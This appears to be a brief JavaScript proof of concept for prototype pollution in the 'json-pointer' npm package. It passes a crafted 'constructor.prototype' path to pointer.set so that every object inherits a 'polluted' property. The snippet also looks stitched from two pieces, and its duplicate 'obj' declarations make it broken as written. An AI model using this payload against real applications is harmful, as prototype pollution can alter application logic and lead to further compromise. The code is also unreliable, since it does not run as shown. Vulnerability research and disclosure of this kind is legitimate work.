var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const pointer = require('json-pointer');
let obj = {};
console.log({}.polluted);
pointer.set(obj, [
    ['constructor.prototype'],
    'polluted'
], 'yes');
console.log({}.polluted);